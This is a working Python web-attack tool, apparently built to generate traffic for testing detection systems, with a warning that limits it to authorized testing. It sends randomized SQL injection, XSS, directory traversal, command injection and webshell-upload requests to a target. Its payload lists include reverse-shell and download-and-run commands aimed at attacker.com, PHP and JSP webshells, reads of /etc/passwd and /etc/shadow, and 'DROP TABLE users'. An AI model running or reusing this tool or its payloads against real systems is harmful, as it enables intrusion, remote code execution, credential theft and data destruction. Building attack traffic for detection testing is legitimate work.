#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Web 攻击脚本（5种攻击方式）
============================

包含：SQL注入、XSS攻击、目录遍历、命令注入、WebShell上传

用法：
  python web_attack.py --target <IP> --attack <sqli|xss|traversal|cmdi|webshell|all>

⚠️ 仅用于授权测试环境，禁止用于未授权目标！

御链天鉴开发团队
"""

import argparse
import random
import socket
import time
import urllib.parse
import sys
from config import TARGET_IP, TARGET_PORT, ATTACK_DURATION

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "sqlmap/1.7.8#stable (https://sqlmap.org)",
    "Nikto/2.1.6",
]

# ========== SQL注入 Payloads ==========
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "admin' --",
    "1' UNION SELECT NULL,NULL,NULL --",
    "1' UNION SELECT username,password FROM users --",
    "1; DROP TABLE users --",
    "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
    "1' AND (SELECT COUNT(*) FROM sysobjects)>0 --",
    "' OR SLEEP(5) --",
    "' OR BENCHMARK(10000000,SHA1('test')) --",
    "1' ORDER BY 1--",
    "1' ORDER BY 10--",
    "-1' UNION SELECT 1,2,3,GROUP_CONCAT(table_name) FROM information_schema.tables--",
    "admin' AND '1'='1",
    "' HAVING 1=1 --",
    "' GROUP BY columnnames HAVING 1=1 --",
    "1; WAITFOR DELAY '0:0:5'--",
    "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
    "1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)--",
]

# ========== XSS Payloads ==========
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<body onload=alert('XSS')>",
    "<iframe src='javascript:alert(1)'>",
    "'\"><script>alert(document.cookie)</script>",
    "<input onfocus=alert(1) autofocus>",
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
    "{{constructor.constructor('alert(1)')()}}",
    "${alert(1)}",
    "<a href='javascript:void(0)' onclick='alert(1)'>click</a>",
    "<div style='background:url(javascript:alert(1))'>",
]

# ========== 目录遍历 Payloads ==========
TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....\\....\\....\\windows\\win.ini",
    "/etc/shadow",
    "/proc/self/environ",
    "/var/log/auth.log",
    "C:\\boot.ini",
    "..%252f..%252f..%252fetc%252fpasswd",
    "..%c0%af..%c0%af..%c0%afetc/passwd",
    "/etc/hosts",
    "../../../../../../../../etc/passwd%00",
    "..%00/..%00/..%00/etc/passwd",
]

# ========== 命令注入 Payloads ==========
CMDI_PAYLOADS = [
    "; ls -la",
    "| cat /etc/passwd",
    "& whoami",
    "`id`",
    "$(cat /etc/passwd)",
    "; ping -c 3 127.0.0.1",
    "| nc -e /bin/sh attacker.com 4444",
    "&& dir C:\\",
    "|| echo vulnerable",
    "; curl http://attacker.com/shell.sh | bash",
    "1;sleep${IFS}5",
    "127.0.0.1%0a cat%20/etc/passwd",
    "${IFS}cat${IFS}/etc/passwd",
    ";echo${IFS}$(whoami)",
    "| wget http://attacker.com/malware -O /tmp/m",
]

# ========== WebShell Payloads ==========
WEBSHELL_PAYLOADS = [
    '<?php system($_GET["cmd"]); ?>',
    '<?php eval($_POST["code"]); ?>',
    '<?php passthru($_REQUEST["c"]); ?>',
    '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>',
    '<?php echo shell_exec($_GET["e"]); ?>',
    '<?php $f=fopen("shell.php","w");fwrite($f,\'<?php system($_GET["c"]);?>\');fclose($f); ?>',
    '<?php @eval(base64_decode($_POST["x"])); ?>',
    '<?=`$_GET[0]`?>',
]


def http_request(target, port, method, path, body=None, headers=None):
    """发送原始HTTP请求"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((target, port))
        ua = random.choice(USER_AGENTS)
        req = f"{method} {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\n"
        if headers:
            for k, v in headers.items():
                req += f"{k}: {v}\r\n"
        if body:
            req += f"Content-Length: {len(body)}\r\nContent-Type: application/x-www-form-urlencoded\r\n"
        req += "Connection: close\r\n\r\n"
        if body:
            req += body
        s.send(req.encode())
        resp = s.recv(4096).decode(errors="ignore")
        s.close()
        return resp
    except Exception:
        return None


# ========== 1. SQL注入 ==========
def sql_injection(target, port=80, duration=30, path="/search"):
    """
    SQL注入攻击：向目标发送各种SQL注入payload
    特征：HTTP请求中包含SQL关键字(UNION/SELECT/DROP/OR 1=1等)
    """
    print(f"[SQL注入] 目标={target}:{port}{path}, 持续={duration}s")
    end_time = time.time() + duration
    count = 0
    inject_points = ["q", "id", "user", "search", "page", "category", "item"]
    while time.time() < end_time:
        payload = random.choice(SQLI_PAYLOADS)
        param = random.choice(inject_points)
        encoded = urllib.parse.quote(payload)
        # GET方式注入
        http_request(target, port, "GET", f"{path}?{param}={encoded}")
        count += 1
        # POST方式注入
        body = f"{param}={encoded}"
        http_request(target, port, "POST", path, body=body)
        count += 1
        time.sleep(random.uniform(0.1, 0.5))
    print(f"[SQL注入] 完成，共发送 {count} 个注入请求")


# ========== 2. XSS 攻击 ==========
def xss_attack(target, port=80, duration=30, path="/search"):
    """
    XSS攻击：向目标发送跨站脚本payload
    特征：HTTP请求中包含<script>、onerror、javascript:等
    """
    print(f"[XSS攻击] 目标={target}:{port}{path}, 持续={duration}s")
    end_time = time.time() + duration
    count = 0
    inject_points = ["q", "name", "comment", "message", "title", "input"]
    while time.time() < end_time:
        payload = random.choice(XSS_PAYLOADS)
        param = random.choice(inject_points)
        encoded = urllib.parse.quote(payload)
        http_request(target, port, "GET", f"{path}?{param}={encoded}")
        count += 1
        body = f"{param}={encoded}"
        http_request(target, port, "POST", path, body=body)
        count += 1
        time.sleep(random.uniform(0.1, 0.5))
    print(f"[XSS攻击] 完成，共发送 {count} 个XSS请求")


# ========== 3. 目录遍历 ==========
def directory_traversal(target, port=80, duration=30):
    """
    目录遍历攻击：尝试访问Web根目录之外的文件
    特征：URL中包含../、%2e%2e/等路径穿越序列
    """
    print(f"[目录遍历] 目标={target}:{port}, 持续={duration}s")
    end_time = time.time() + duration
    count = 0
    base_paths = ["/download?file=", "/image?path=", "/include?page=",
                  "/view?doc=", "/read?f=", "/static/", "/assets/"]
    while time.time() < end_time:
        payload = random.choice(TRAVERSAL_PAYLOADS)
        base = random.choice(base_paths)
        encoded = urllib.parse.quote(payload)
        http_request(target, port, "GET", f"{base}{encoded}")
        count += 1
        time.sleep(random.uniform(0.1, 0.3))
    print(f"[目录遍历] 完成，共发送 {count} 个遍历请求")


# ========== 4. 命令注入 ==========
def command_injection(target, port=80, duration=30, path="/ping"):
    """
    命令注入攻击：在参数中注入OS命令
    特征：HTTP请求中包含; | & ` $()等Shell元字符
    """
    print(f"[命令注入] 目标={target}:{port}{path}, 持续={duration}s")
    end_time = time.time() + duration
    count = 0
    inject_points = ["ip", "host", "cmd", "exec", "command", "target", "url"]
    while time.time() < end_time:
        payload = random.choice(CMDI_PAYLOADS)
        param = random.choice(inject_points)
        encoded = urllib.parse.quote(payload)
        http_request(target, port, "GET", f"{path}?{param}={encoded}")
        count += 1
        body = f"{param}={encoded}"
        http_request(target, port, "POST", path, body=body)
        count += 1
        time.sleep(random.uniform(0.1, 0.5))
    print(f"[命令注入] 完成，共发送 {count} 个注入请求")


# ========== 5. WebShell上传 ==========
def webshell_upload(target, port=80, duration=30, path="/upload"):
    """
    WebShell上传攻击：模拟上传恶意PHP/JSP文件
    特征：HTTP POST multipart上传，文件内容包含eval/system/passthru
    """
    print(f"[WebShell上传] 目标={target}:{port}{path}, 持续={duration}s")
    end_time = time.time() + duration
    count = 0
    filenames = ["shell.php", "cmd.php", "backdoor.jsp", "test.php.jpg",
                 "upload.phtml", "hack.php5", "evil.asp", "c99.php"]
    while time.time() < end_time:
        shell_code = random.choice(WEBSHELL_PAYLOADS)
        filename = random.choice(filenames)
        boundary = f"----WebKitFormBoundary{''.join(random.choices('abcdefghijklmnop', k=16))}"
        body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'
            f"Content-Type: application/octet-stream\r\n\r\n"
            f"{shell_code}\r\n"
            f"--{boundary}--\r\n"
        )
        headers = {"Content-Type": f"multipart/form-data; boundary={boundary}"}
        http_request(target, port, "POST", path, body=body, headers=headers)
        count += 1
        time.sleep(random.uniform(0.3, 1.0))
    print(f"[WebShell上传] 完成，共尝试 {count} 次上传")


# ========== 主入口 ==========
ATTACK_MAP = {
    "sqli": ("SQL注入攻击", sql_injection),
    "xss": ("XSS跨站脚本攻击", xss_attack),
    "traversal": ("目录遍历攻击", directory_traversal),
    "cmdi": ("命令注入攻击", command_injection),
    "webshell": ("WebShell上传攻击", webshell_upload),
}

def main():
    parser = argparse.ArgumentParser(description="Web攻击工具 - 御链天鉴")
    parser.add_argument("--target", "-t", default=TARGET_IP, help=f"目标IP地址 (默认: {TARGET_IP})")
    parser.add_argument("--attack", "-a", default="sqli",
                        choices=list(ATTACK_MAP.keys()) + ["all"], help="攻击类型")
    parser.add_argument("--port", "-p", type=int, default=80, help="目标端口")
    parser.add_argument("--duration", "-d", type=int, default=30, help="持续时间(秒)")
    args = parser.parse_args()

    print(f"{'='*60}")
    print(f"Web 攻击工具 - 御链天鉴")
    print(f"目标: {args.target}:{args.port}")
    print(f"持续: {args.duration}s")
    print(f"{'='*60}")

    if args.attack == "all":
        for key, (name, func) in ATTACK_MAP.items():
            print(f"\n--- {name} ---")
            func(args.target, port=args.port, duration=min(args.duration, 20))
            time.sleep(2)
    else:
        name, func = ATTACK_MAP[args.attack]
        print(f"\n--- {name} ---")
        func(args.target, port=args.port, duration=args.duration)

    print(f"\n{'='*60}")
    print("攻击完成")


if __name__ == "__main__":
    main()
